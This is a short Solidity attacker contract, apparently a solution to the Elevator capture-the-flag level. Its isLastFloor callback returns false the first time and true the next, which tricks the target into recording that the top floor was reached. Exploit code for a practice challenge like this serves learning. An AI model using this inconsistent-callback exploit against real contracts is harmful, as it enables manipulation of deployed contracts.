// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Building} from "@main/11_Elevator.sol";

interface IElevator {
  function goTo(uint _floor) external;
}

contract ElevatorAttacker is Building {
    IElevator elevator;
    bool firstCalled;
    constructor(address _elevator) {
        elevator = IElevator(_elevator);
        firstCalled = false;
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint ) external returns (bool) {
        if (!firstCalled) {
            firstCalled = true;
            return false;
        } else {
            return true;
        }
    }

}